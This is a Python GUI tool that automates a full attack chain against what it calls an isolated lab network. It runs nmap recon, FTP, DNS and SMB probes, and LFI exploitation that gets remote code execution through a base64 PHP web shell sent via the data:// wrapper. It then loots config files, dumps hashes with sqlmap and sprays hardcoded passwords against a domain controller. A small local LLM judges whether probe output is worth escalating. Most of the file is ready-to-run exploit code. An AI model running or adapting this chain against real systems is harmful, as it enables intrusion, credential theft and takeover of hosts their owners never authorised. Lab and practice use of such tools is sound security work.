#!/usr/bin/env python3
"""gunbelt WAR ROOM — recon feeds → the autocannon.

The picture (Ben's): real recon feeds the targeting computer, which lays out the
attack PATHS; gunbelt is the belt; the autocannon spams the bash commands into as
many concurrent command-prompts as the box can take. Chains are pre-staged — the
instant a precondition trips, the next link is ALREADY firing. The 1.7b rides the
belt as the fast go/no-go judge on ambiguous returns.

LEFT RAIL = the info feeds (like BS2):
  ▸ RECON / INTEL   — live nmap stream + parsed ports/services/versions (REAL recon)
  ▸ FRONTIER        — attack paths: confirmed facts · staged chains · next to confirm
  ▸ LEDGER          — confirmed facts + the lane that produced each
RIGHT = the autocannon grid (one live command-prompt per lane).

NO LLM in the hot loop. Dataflow-triggered, continuous. Every panel is a REAL lane
firing a REAL command over a multiplexed ssh to your-host (which reaches the docker nets).

Runs on your-host (:0). Execution host = your-host. Target = lab2 by default (isolated
second instance; the first box is left for the other agent).
  GB_EDGE / GB_INT override the /24 prefixes (default 172.32.0 / 172.33.0 = lab2).
"""
import base64, json, os, queue, re, subprocess, threading, time, urllib.request
import tkinter as tk
from tkinter import font as tkfont

JAGG="your-host"
CTRL=["-o","ControlMaster=auto","-o","ControlPath=/tmp/gb-ssh-%r@%h:%p",
      "-o","ControlPersist=180","-o","ConnectTimeout=8"]
EDGE=os.environ.get("GB_EDGE","172.32.0")     # lab2 edge
INT =os.environ.get("GB_INT","172.33.0")      # lab2 internal
DOMAIN="inlanefreight.local"
RCE_B64=base64.b64encode(b"<?php system($_GET[0]); ?>").decode()
CAP=20; COLS=6; POLL=60; SPAWN=120
DAGGOTH="http://your-host:11434/api/generate"

BG="#0a0e0a"; PANEL="#0d130d"; RAIL="#0c110c"; GREY="#26331f"; AMBER="#e8a33d"
GREEN="#39ff5e"; RED="#ff4d4d"; DIM="#5a6b5a"; TXT="#b9ffc4"; HEAD="#8affa0"
GOLD="#ffd24a"; CYAN="#4fd6ff"

def sh(cmd, timeout=180):
    try:
        r=subprocess.run(["ssh",*CTRL,JAGG,cmd],capture_output=True,text=True,timeout=timeout)
        return r.stdout+r.stderr
    except Exception as e:
        return f"(err {e})"

def rce(web,cmd):
    return (f"curl -s --max-time 12 'http://{web}/index.php?"
            f"page=data://text/plain;base64,{RCE_B64}&0={cmd}'")

HTTP_PROBES=["/robots.txt","/.git/HEAD","/.env","/server-status","/phpinfo.php","/info.php",
  "/wp-login.php","/wp-json/wp/v2/users","/xmlrpc.php","/administrator/","/admin/","/config.php",
  "/backup.zip","/status.php","/wp-config.php.bak","/readme.html","/wp-content/","/.htaccess",
  "/uploads/","/license.txt","/wp-admin/","/phpmyadmin/"]

# ---------------------------------------------------------------- 1.7b judge
def ask_17b(tag, digest):
    try:
        prompt=("/no_think Pentest triage. A probe returned the output below. Is it a REAL "
                "finding worth escalating (not a bland 403/empty)? Reply ONLY JSON "
                '{"worth":true|false}.\nPROBE '+tag+"\nOUTPUT: "+digest[:400])
        body=json.dumps({"model":"qwen3:1.7b","prompt":prompt,"stream":False,
                         "options":{"temperature":0}}).encode()
        req=urllib.request.Request(DAGGOTH,body,{"Content-Type":"application/json"})
        r=json.load(urllib.request.urlopen(req,timeout=6))["response"]
        i,j=r.find("{"),r.rfind("}")
        return bool(json.loads(r[i:j+1]).get("worth")) if i>=0 else None
    except Exception:
        return None

# ---------------------------------------------------------------- belt (built from recon)
def build_belt(bind):
    """bind: {'ftp':ip,'dns':ip,'smb':ip,'http':ip,'wp':bool}. Only bound services get lanes."""
    L=[]
    web=bind.get("http")
    if bind.get("ftp"):
        f=bind["ftp"]
        L.append(dict(id="ftp-anon",recipe="ftp-anon",phase="recon",tier="floor",target=f,
            needs=set(),gives="ftp_flag",tag="ftp:21",
            cmd=f"curl -s --max-time 12 ftp://anonymous:anonymous@{f}/",hit=lambda o:o.strip()!=""))
    if bind.get("dns"):
        d=bind["dns"]
        L.append(dict(id="dns-axfr",recipe="dns-axfr",phase="recon",tier="floor",target=d,
            needs=set(),gives="dc_disc",tag="dns:53",cmd=f"dig axfr @{d} {DOMAIN}",
            hit=lambda o:"SOA" in o and "IN" in o))
    if bind.get("smb"):
        s=bind["smb"]
        L.append(dict(id="smb-null",recipe="smb-null-session",phase="enum",tier="floor",target=s,
            needs=set(),gives="share",tag="smb:445",cmd=f"smbclient -N -L //{s}/",
            hit=lambda o:"Disk" in o or "Sharename" in o))
    if web:
        L.append(dict(id="ffuf-dir",recipe="http-defaults",phase="enum",tier="floor",target=web,
            needs=set(),gives="",tag="web:ffuf",
            cmd=f"ffuf -u http://{web}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt "
                f"-t 40 -mc 200,301,401,403 -s",hit=lambda o:o.strip()!=""))
        for p in HTTP_PROBES:
            gives="wp" if p=="/wp-login.php" else ""
            L.append(dict(id=f"http{p}",recipe="http-defaults",phase="enum",tier="floor",target=web,
                needs=set(),gives=gives,tag=p,amber=True,
                cmd=f"curl -s -o /dev/null -w '%{{http_code}} %{{size_download}}b' --max-time 8 "
                    f"http://{web}{p}",hit=lambda o:o.split(" ")[0] in ("200","301","302")))
        # FOOTHOLD — staged behind wp; every LFI variant fires, reliable one wins
        L.append(dict(id="lfi-data",recipe="lfi-rce",phase="exploit",tier="std",target=web,gold=True,
            needs={"wp"},gives="shell",tag="data://",cmd=rce(web,"id"),hit=lambda o:"uid=" in o))
        L.append(dict(id="lfi-phpfilter",recipe="lfi-rce",phase="exploit",tier="std",target=web,
            needs={"wp"},gives="",tag="php://filter",
            cmd=f"curl -s --max-time 10 'http://{web}/index.php?page=php://filter/convert."
                f"base64-encode/resource=wp-config.php'",
            hit=lambda o:len(o.strip())>40 and all(c.isalnum() or c in '+/=\n' for c in o.strip()[:40])))
        L.append(dict(id="lfi-pearcmd",recipe="lfi-rce",phase="exploit",tier="std",target=web,
            needs={"wp"},gives="",tag="pearcmd",
            cmd=f"curl -s --max-time 8 'http://{web}/index.php?page=/usr/local/lib/php/pearcmd"
                f"&+config-create+/<?=1?>+/tmp/x'",hit=lambda o:"uid=" in o))
        L.append(dict(id="lfi-passwd",recipe="lfi-rce",phase="exploit",tier="std",target=web,
            needs={"wp"},gives="",tag="../etc/passwd",
            cmd=f"curl -s --max-time 8 'http://{web}/index.php?page=../../../../etc/passwd'",
            hit=lambda o:"root:x:0" in o))
        # LOOT + DUMP — staged behind shell
        L.append(dict(id="loot-wpconfig",recipe="loot-shell-env",phase="loot",tier="floor",
            target=web,gold=True,needs={"shell"},gives="db_cred",tag="wp-config",
            cmd=rce(web,"cat /var/www/html/wp-config.php | grep -E 'DB_|AUTH'"),
            hit=lambda o:"DB_PASSWORD" in o))
        L.append(dict(id="loot-flag",recipe="loot-shell-env",phase="loot",tier="floor",target=web,
            needs={"shell"},gives="",tag="flag-hunt",amber=True,
            cmd=rce(web,"cat /flag.txt /root/flag.txt 2>/dev/null; find / -name 'flag*' 2>/dev/null|head"),
            hit=lambda o:o.strip()!=""))
        L.append(dict(id="loot-net",recipe="loot-shell-env",phase="loot",tier="floor",target=web,
            needs={"shell"},gives="",tag="net-recon",cmd=rce(web,"hostname -I; cat /etc/hosts"),
            hit=lambda o:o.strip()!=""))
        L.append(dict(id="sqli-dump",recipe="web-sqli-dump",phase="exploit",tier="std",target=web,
            gold=True,needs={"wp"},gives="creds",tag="status.php?u",
            cmd=f"sqlmap -u 'http://{web}/status.php?u=1' --batch --dump --threads 4 2>&1 | "
                f"grep -E '\\$P\\$|user_login|user_pass|Database:|Table:|entries' | head -25",
            hit=lambda o:"$P$" in o or "user_pass" in o))
    # PIVOT — DC ip is resolved at fire time from the AXFR (dyn cmd); needs dc + creds
    for u,pw,gold in [("tom","charlie1",True),("administrator","Passw0rd1!",True),
                      ("james","sunshine",False),("tom","Welcome1",False)]:
        L.append(dict(id=f"spray-{u}-{pw}",recipe="ad-password-spray",phase="cred",tier="std",
            target="DC",gold=gold,needs={"dc_disc","creds"},gives=("dc_owned" if gold else ""),
            tag=f"{u}:{pw}",dyn=lambda dc,u=u,pw=pw:f"smbclient -L //{dc}/ -U '{u}%{pw}' 2>&1",
            hit=lambda o:"Disk" in o or "Sharename" in o))
    return L

# ---------------------------------------------------------------- war room
class WarRoom:
    def __init__(self,root):
        self.root=root; self.q=queue.Queue()
        self.bind={}; self.dc=None; self.lanes={}; self.facts=set(); self.started=set()
        self.inflight=0; self.done=0; self.n_hit=self.n_miss=self.n_amber=0
        self.t0=time.time(); self.panels={}; self.intel=[]; self.ledger=[]; self.recon_ok=False
        self.mono=tkfont.Font(family="DejaVu Sans Mono",size=8)
        self.rail=tkfont.Font(family="DejaVu Sans Mono",size=8)
        self.monob=tkfont.Font(family="DejaVu Sans Mono",size=10,weight="bold")
        self.bigf=tkfont.Font(family="DejaVu Sans Mono",size=18,weight="bold")
        root.configure(bg=BG); root.title("gunbelt WAR ROOM — autocannon")
        self._chrome()
        subprocess.Popen(["ssh","-MNf",*CTRL,JAGG])
        threading.Thread(target=self.recon,daemon=True).start()
        root.after(POLL,self.drain); root.after(150,self.tick)

    def _chrome(self):
        top=tk.Frame(self.root,bg=BG); top.pack(fill="x",padx=10,pady=(8,2))
        self.title=tk.Label(top,text="◈ gunbelt  AUTOCANNON",font=self.bigf,fg=GOLD,bg=BG); self.title.pack(side="left")
        tk.Label(top,text=f"  target: lab2  ({EDGE}.0/24 → {INT}.0/24)",font=self.monob,
            fg=DIM,bg=BG).pack(side="left",padx=12)
        self.clock=tk.Label(top,text="00.0s",font=self.bigf,fg=DIM,bg=BG); self.clock.pack(side="right")
        body=tk.Frame(self.root,bg=BG); body.pack(fill="both",expand=True,padx=8,pady=4)
        # LEFT RAIL — feeds
        rail=tk.Frame(body,bg=RAIL,width=430); rail.pack(side="left",fill="y",padx=(0,6)); rail.pack_propagate(False)
        self.intel_t=self._feed(rail,"▸ RECON / INTEL   (live nmap → ports·services·versions)",13)
        self.front_t=self._feed(rail,"▸ FRONTIER   (attack paths · staged chains · next)",11)
        self.ledg_t=self._feed(rail,"▸ LEDGER   (confirmed facts + evidence)",8)
        # RIGHT — pipeline + gauge + autocannon grid
        right=tk.Frame(body,bg=BG); right.pack(side="left",fill="both",expand=True)
        self.pipe=tk.Label(right,text="",font=self.monob,bg="#111a10",fg=TXT,anchor="w",padx=12,pady=6)
        self.pipe.pack(fill="x")
        self.gauge=tk.Label(right,text="",font=self.monob,bg="#0e150e",fg=CYAN,anchor="w",padx=12,pady=4)
        self.gauge.pack(fill="x",pady=(3,4))
        wrap=tk.Frame(right,bg=BG); wrap.pack(fill="both",expand=True)
        self.cv=tk.Canvas(wrap,bg=BG,highlightthickness=0); self.cv.pack(side="left",fill="both",expand=True)
        sb=tk.Scrollbar(wrap,command=self.cv.yview); sb.pack(side="right",fill="y")
        self.cv.configure(yscrollcommand=sb.set)
        self.grid=tk.Frame(self.cv,bg=BG); self.cv.create_window((0,0),window=self.grid,anchor="nw")
        self.grid.bind("<Configure>",lambda e:self.cv.configure(scrollregion=self.cv.bbox("all")))
        for w in ("<MouseWheel>","<Button-4>","<Button-5>"):
            self.cv.bind_all(w,lambda e:self.cv.yview_scroll(
                int(-(e.delta/120)) if getattr(e,'delta',0) else (1 if getattr(e,'num',0)==5 else -1),"units"))
        bot=tk.Frame(right,bg=BG); bot.pack(fill="x",pady=(2,0))
        self.ticker=tk.Label(bot,text="",font=self.monob,fg=GREEN,bg=BG,anchor="w"); self.ticker.pack(side="left",fill="x",expand=True)
        tk.Button(bot,text="⟳ RESET LAB + RELOAD",font=self.monob,fg="#0a0e0a",bg=AMBER,
            relief="flat",command=self.reset).pack(side="right")
        self.pipe.config(text="  RECON ▸ scanning… ═▶ ARIADNE (paths) ═▶ GUNBELT belt ═▶ ◉◉◉ AUTOCANNON")
        self.refresh_bands()

    def _feed(self,parent,title,h):
        tk.Label(parent,text=title,font=("DejaVu Sans Mono",8,"bold"),fg=HEAD,bg="#0f1710",
            anchor="w",padx=6,pady=3).pack(fill="x",pady=(4,0))
        t=tk.Text(parent,height=h,bg=PANEL,fg=TXT,font=self.rail,bd=0,highlightthickness=0,
            wrap="none",padx=6,pady=3); t.pack(fill="both",expand=True,padx=4,pady=(0,2))
        t.configure(state="disabled"); return t

    def _put(self,widget,line,color=None,clear=False):
        widget.configure(state="normal")
        if clear: widget.delete("1.0","end")
        widget.insert("end",line+"\n")
        if color:
            widget.tag_add(color,"end-2l","end"); widget.tag_config(color,foreground=color)
        widget.see("end")
        if int(widget.index('end-1c').split('.')[0])>200: widget.delete("1.0","60.0")
        widget.configure(state="disabled")

    def tick(self): self.clock.config(text=f"{time.time()-self.t0:04.1f}s"); self.root.after(150,self.tick)

    # ---- REAL recon ----
    def recon(self):
        self.q.put(("intel",f"$ nmap -sn {EDGE}.10-30   (host discovery)",DIM))
        disc=sh(f"nmap -sn {EDGE}.10-30 --min-rate 5000 2>/dev/null | grep -oE '{re.escape(EDGE)}\\.[0-9]+'")
        hosts=sorted(set(re.findall(rf"{re.escape(EDGE)}\.\d+",disc)),key=lambda x:int(x.split('.')[-1]))
        self.q.put(("intel",f"  live hosts: {', '.join(h.split('.')[-1] for h in hosts) or 'none'}",CYAN))
        rng=f"{EDGE}.10-30"
        self.q.put(("intel",f"$ nmap -sV -p 21,22,53,80,110,139,443,445,3306,8080,9000 -T4 --min-rate 5000 {rng}",DIM))
        out=sh(f"nmap -sV -p 21,22,53,80,110,139,443,445,3306,8080,9000 -T4 --min-rate 5000 {rng} -oG - 2>/dev/null",timeout=150)
        bind={}
        for line in out.splitlines():
            m=re.match(rf"Host: ({re.escape(EDGE)}\.\d+).*Ports: (.+)",line)
            if not m: continue
            ip,ports=m.group(1),m.group(2)
            for pspec in ports.split(","):
                f=pspec.split("/");
                if len(f)<7 or f[1].strip()!="open": continue
                port,name,prod=f[0].strip(),f[4].strip(),f[6].strip()
                self.q.put(("intel",f"  {ip.split('.')[-1]:>3}  {port:>5}/tcp  {name:<12}{prod[:22]}",TXT))
                if name in ("ftp",): bind["ftp"]=ip
                elif name in ("domain","dns"): bind["dns"]=ip
                elif name in ("microsoft-ds","netbios-ssn","smb"): bind["smb"]=ip
                elif name in ("http","http-proxy") or port in ("80","8080"): bind["http"]=ip
        # web fingerprint -> wordpress?
        if bind.get("http"):
            fp=sh(f"curl -s --max-time 8 -i http://{bind['http']}/ ; curl -s --max-time 6 http://{bind['http']}/wp-login.php -o /dev/null -w '%{{http_code}}'")
            if "wp-content" in fp or "wordpress" in fp.lower() or fp.strip().endswith(("200","302")):
                bind["wp"]=True
                self.q.put(("intel",f"  fingerprint: WordPress on {bind['http'].split('.')[-1]} → LFI arsenal armed",GOLD))
        self.q.put(("recon_done",bind))

    # ---- dataflow scheduler ----
    def start_cascade(self,bind):
        self.bind=bind; self.recon_ok=True
        self.lanes={l["id"]:l for l in build_belt(bind)}
        self.q.put(("intel",f"  → belt loaded: {len(self.lanes)} lanes across "
                   f"{sum(1 for k in ('ftp','dns','smb','http') if bind.get(k))} services",GREEN))
        self.schedule()

    def schedule(self):
        for lid,l in self.lanes.items():
            if lid in self.started or not (l["needs"]<=self.facts): continue
            if self.inflight>=CAP: break
            self.started.add(lid); self.inflight+=1
            self.spawn_panel(l); threading.Thread(target=self.fire,args=(l,),daemon=True).start()
        self.refresh_bands()
        if self.lanes and (len(self.started)<len(self.lanes) or self.inflight>0):
            self.root.after(SPAWN,self.schedule)
        elif "dc_owned" in self.facts:
            self.title.config(text="◈ gunbelt  AUTOCANNON   ✔ BOX OWNED",fg=GREEN)

    def spawn_panel(self,l):
        idx=len(self.panels); r,c=divmod(idx,COLS)
        f=tk.Frame(self.grid,bg=AMBER,highlightthickness=2,highlightbackground=AMBER)
        f.grid(row=r,column=c,padx=3,pady=3,sticky="nsew"); self.grid.grid_columnconfigure(c,weight=1)
        tgt=(self.dc or "DC") if l["target"]=="DC" else l["target"]
        hd=tk.Label(f,text=f"{l['recipe'][:12]}›{l['tag'][-14:]}",font=("DejaVu Sans Mono",7,"bold"),
            fg=HEAD,bg=PANEL,anchor="w",padx=4); hd.pack(fill="x")
        b=tk.Text(f,width=30,height=6,bg=PANEL,fg=TXT,font=self.mono,bd=0,highlightthickness=0,
            wrap="none",padx=4,pady=2); b.pack(fill="both",expand=True)
        b.insert("end",f"◉ FIRE {tgt}\n"); b.configure(state="disabled")
        self.panels[l["id"]]={"frame":f,"body":b,"hd":hd}

    def fire(self,l):
        cmd=l.get("cmd") or (l["dyn"](self.dc) if l.get("dyn") and self.dc else None)
        if not cmd: self.q.put(("done",l["id"],False,l,None)); return
        try:
            p=subprocess.Popen(["ssh",*CTRL,JAGG,cmd],stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,text=True,bufsize=1)
            buf=[]
            for line in p.stdout:
                buf.append(line); self.q.put(("line",l["id"],line.rstrip("\n")[:118]))
            p.wait(timeout=150); out="".join(buf)
        except Exception as e: out=f"(err {e})"
        try: ok=bool(l["hit"](out))
        except Exception: ok=False
        # capture DC ip from AXFR for the pivot lanes
        if l["id"]=="dns-axfr" and ok:
            m=re.search(rf"({re.escape(INT)}\.\d+)",out)
            if m: self.dc=m.group(1)
        verdict=None
        if not ok and l.get("amber") and out.strip():
            self.q.put(("amber",l["id"])); verdict=ask_17b(l["tag"],out); ok=bool(verdict)
        self.q.put(("done",l["id"],ok,l,verdict))

    def drain(self):
        try:
            while True:
                m=self.q.get_nowait(); k=m[0]
                if k=="intel": self._put(self.intel_t,m[1],m[2] if len(m)>2 else None)
                elif k=="recon_done": self.start_cascade(m[1])
                elif k=="line":
                    pan=self.panels.get(m[1])
                    if pan:
                        b=pan["body"]; b.configure(state="normal"); b.insert("end",m[2]+"\n"); b.see("end")
                        if int(b.index('end-1c').split('.')[0])>36: b.delete("1.0","8.0")
                        b.configure(state="disabled")
                elif k=="amber":
                    pan=self.panels.get(m[1]); self.n_amber+=1
                    if pan:
                        pan["frame"].config(highlightbackground=CYAN)
                        self._put(pan["body"],"◇ 1.7b adjudicating…")
                elif k=="done":
                    _,lid,ok,l,verdict=m; self.inflight=max(0,self.inflight-1); self.done+=1
                    pan=self.panels.get(lid); col=GREEN if ok else RED
                    gold=ok and l.get("gold")
                    if pan:
                        pan["frame"].config(highlightbackground=(GOLD if gold else col))
                        pan["hd"].config(fg=(GOLD if gold else col))
                        tail="✔ HIT" if ok else "�’ miss"
                        if verdict is not None: tail+=f"  ◇1.7b={verdict}"
                        self._put(pan["body"],tail,(GOLD if gold else col))
                    self.n_hit+=ok; self.n_miss+=(not ok)
                    if ok and l.get("gives"):
                        if l["gives"] not in self.facts:
                            self.facts.add(l["gives"]); self.announce(l["gives"],l)
                            self.root.after(1,self.schedule)
                self.refresh_bands()
        except queue.Empty: pass
        self.root.after(POLL,self.drain)

    def announce(self,fact,lane):
        m={"ftp_flag":"FTP flag looted","dc_disc":f"DNS AXFR → DC @ {self.dc or INT+'.40'} — pivot staged",
           "share":"SMB null share readable","wp":"WordPress → LFI arsenal staged",
           "shell":"www-data SHELL (LFI data:// RCE) — CAPABILITY JUMP; loot+SQLi firing",
           "db_cred":"MySQL root cred looted from wp-config","creds":"phpass hashes dumped via SQLi → spray armed",
           "dc_owned":f"cred-reuse → DC {self.dc or INT+'.40'} OWNED — CHAIN COMPLETE"}
        txt=m.get(fact,fact)
        self.msgs=getattr(self,"msgs",[]); self.msgs.append("⚑ "+txt)
        self.ticker.config(text="   ·   ".join(self.msgs[-2:]))
        self.ledger.append(f"⚑ {fact:9} ← {lane['id']}  ({lane['recipe']})")
        self._put(self.ledg_t,f"⚑ {fact:9} ← {lane['id']}",GOLD if lane.get("gold") else GREEN)

    def refresh_bands(self):
        if not self.lanes:
            self.gauge.config(text="  recon in progress — belt not yet loaded"); return
        elig=sum(1 for i,l in self.lanes.items() if l["needs"]<=self.facts and i not in self.started)
        staged=sum(1 for i,l in self.lanes.items() if not(l["needs"]<=self.facts) and i not in self.started)
        stall=elig==0 and self.inflight==0 and staged>0 and len(self.started)<len(self.lanes)
        fchips={"ftp_flag":"flag","dc_disc":"DC","share":"share","wp":"wordpress","shell":"SHELL",
                "db_cred":"db-cred","creds":"hashes","dc_owned":"DC-OWNED"}
        got=" ".join(f"[{fchips[f]}]" for f in fchips if f in self.facts) or "—"
        self.pipe.config(text=(f"  RECON ▸ ARIADNE  paths mapped {got}   ═▶   MEMORIA "
            f"{'HOT-LOAD (stall!)' if stall else 'belt loaded'}   ═▶   GUNBELT   ═▶   ◉◉◉ AUTOCANNON"))
        bar="█"*self.inflight+"·"*(CAP-self.inflight)
        self.gauge.config(text=(f"  IN-FLIGHT [{bar}] {self.inflight:2d}/{CAP}   ·   eligible {elig:2d}   "
            f"·   staged {staged:2d}   ·   ✔{self.n_hit} ◇{self.n_amber} �’{self.n_miss}   "
            f"·   fired {self.done}/{len(self.lanes)}"))
        # frontier feed: staged chains
        self.front_t.configure(state="normal"); self.front_t.delete("1.0","end")
        self.front_t.insert("end",f"confirmed: {got}\n\n")
        for lid,l in self.lanes.items():
            if lid in self.started: continue
            need=",".join(sorted(l["needs"])) or "∅"
            ready = l["needs"]<=self.facts
            mark="▶" if ready else "·"
            self.front_t.insert("end",f" {mark} {l['recipe'][:11]:11} need[{need}] →{l.get('gives') or '—'}\n")
        self.front_t.configure(state="disabled")

    def reset(self):
        self._put(self.intel_t,"⟳ resetting lab2 to pristine, reloading…",AMBER,clear=True)
        threading.Thread(target=lambda:subprocess.run(["ssh",*CTRL,JAGG,
            "cd ~/gunbelt-lab2 && ./reset.sh"],capture_output=True,text=True),daemon=True).start()
        for p in self.panels.values(): p["frame"].destroy()
        self.__dict__.update(bind={},dc=None,lanes={},facts=set(),started=set(),inflight=0,done=0,
            n_hit=0,n_miss=0,n_amber=0,t0=time.time(),panels={},msgs=[],recon_ok=False)
        self.ticker.config(text=""); self.title.config(text="◈ gunbelt  AUTOCANNON",fg=GOLD)
        for t in (self.front_t,self.ledg_t): self._put(t,"",clear=True)
        self.root.after(6000,lambda:threading.Thread(target=self.recon,daemon=True).start())

if __name__=="__main__":
    root=tk.Tk(); root.geometry("1920x1060"); WarRoom(root); root.mainloop()
